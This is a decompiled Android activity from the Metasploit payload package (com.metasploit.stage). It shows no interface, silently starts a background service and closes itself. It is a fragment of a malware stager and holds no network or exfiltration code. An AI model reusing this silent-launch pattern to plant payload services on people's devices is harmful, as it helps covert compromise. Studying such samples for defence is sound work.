package com.metasploit.stage;

import android.app.Activity;
import android.os.Bundle;

public class MainActivity extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        MainService.startService(this);
        finish();
    }
}
